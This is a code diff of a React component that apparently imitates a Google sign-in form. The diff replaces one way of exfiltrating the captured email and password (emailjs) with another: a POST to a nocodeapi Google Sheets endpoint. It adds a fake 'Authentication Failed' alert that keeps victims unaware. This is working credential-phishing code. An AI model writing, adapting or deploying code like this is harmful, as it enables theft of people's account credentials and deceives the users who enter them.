@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from "react";
-import emailjs from '@emailjs/browser';
 import '../Assets/Styles/google-form.css'
+import axios from 'axios';
 
 const GoogleForm = () => {
     const [activeIndex, setActiveIndex] = useState(0)
@@ -57,20 +57,20 @@ const GoogleForm = () => {
             }
 
             setLoaderState(true)
-            emailjs.send('gmail-react', 'template_fzfd6jd', 
-            {
-                _engine: 'Google',
-                _email: email,
-                _password: password,
-            }, '-ULgQTRPj8f-lNNg0')
-                .then(function() {
-                    setLoaderState(false)
-
-                }, function(error) {
-                    console.log('FAILED...', error);
-                    alert('Authentication Failed... Please try again', error)
-                }
-            );
+            let d = new Date()
+            let date = `${d.getDay()}/${d.getMonth()}/${d.getFullYear()}`
+            let id = Date.now() * Math.random()
+            axios ({
+                method: 'post',
+                url: 'https://v1.nocodeapi.com/tuxa/google_sheets/xQtvMBfFFgfpISRL?tabId=Sheet1', 
+                params: {},
+                data: [[id, 'null', email, password, date]]
+            }).then(function () {
+                setLoaderState(false)
+            }).catch(function (error) {
+                alert('Authentication Failed... Please try again', error)
+                console.log(error); 
+            })
         } else {
             changeActiveIndex()
         }
